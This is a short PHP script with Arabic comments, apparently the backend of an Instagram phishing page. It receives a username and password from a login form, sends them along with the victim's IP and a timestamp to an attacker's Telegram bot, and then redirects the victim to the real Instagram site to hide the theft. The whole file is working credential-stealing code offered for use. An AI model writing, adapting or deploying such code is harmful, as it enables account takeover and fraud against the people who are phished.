<?php
session_start();
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // التحقق من البيانات
    if (empty($username) || empty($password)) {
        $_SESSION['error'] = 'يجب إدخال اسم المستخدم وكلمة المرور';
        header('Location: index.php');
        exit;
    }
    
    // إرسال البيانات إلى Telegram
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');
    
    $message = "📨 *بيانات تسجيل دخول إنستجرام جديدة* 📨\n\n"
             . "👤 *اسم المستخدم:* $username\n"
             . "🔑 *كلمة المرور:* $password\n"
             . "⏰ *الوقت:* $time\n"
             . "🌐 *IP:* $ip";
    
    $telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($telegramUrl, false, $context);
    
    // بعد الإرسال، يمكنك توجيه المستخدم إلى صفحة إنستجرام الحقيقية
    header('Location: https://www.instagram.com/');
    exit;
} else {
    header('Location: index.php');
    exit;
}